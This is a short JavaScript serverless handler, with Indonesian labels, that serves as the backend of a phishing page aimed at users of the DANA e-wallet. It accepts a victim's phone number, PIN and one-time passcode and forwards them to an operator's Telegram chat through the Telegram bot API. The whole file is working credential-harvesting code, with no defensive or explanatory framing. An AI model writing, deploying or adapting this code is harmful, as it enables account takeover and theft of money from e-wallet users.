const axios = require('axios');

// Format pesan Telegram
function formatMessage(type, phone, pin, otp) {
  const formattedPhone = phone.replace(/(\d{3})(\d{4})(\d{3,4})/, '$1-$2-$3');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${formattedPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  message += "╰───────────────────";
  return message;
}

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    const { type, phone, pin, otp } = JSON.parse(event.body);

    if (!type || !phone || phone.length < 10) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Nomor HP tidak valid' })
      };
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      throw new Error('Telegram configuration missing');
    }

    const message = formatMessage(type, phone, pin, otp);

    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: 'Internal Server Error',
        details: error.message
      })
    };
  }
};
